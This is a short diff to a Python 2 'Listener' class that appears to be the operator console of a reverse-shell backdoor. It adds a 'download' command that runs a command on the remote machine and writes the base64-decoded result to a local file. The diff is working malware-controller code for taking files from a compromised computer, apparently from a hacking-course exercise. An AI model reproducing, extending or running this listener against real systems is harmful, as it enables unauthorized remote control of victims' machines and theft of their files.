@@ -1,4 +1,5 @@
-import socket, json
+import json
+import socket, base64
 
 
 class Listener:
@@ -33,11 +34,20 @@ class Listener:
             exit()
         return self.reliable_recv()
 
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(content))
+            return "[+] Download successful."
+
     def run(self):
         while True:
             command = raw_input(">> ")
-            command = command.split(" ")
+            command = command.split(" ")  # split into list
             result = self.execute_remotely(command)
+
+            if command[0] == "download":
+                result = self.write_file(command[1], result)
+
             print(result)
 
 
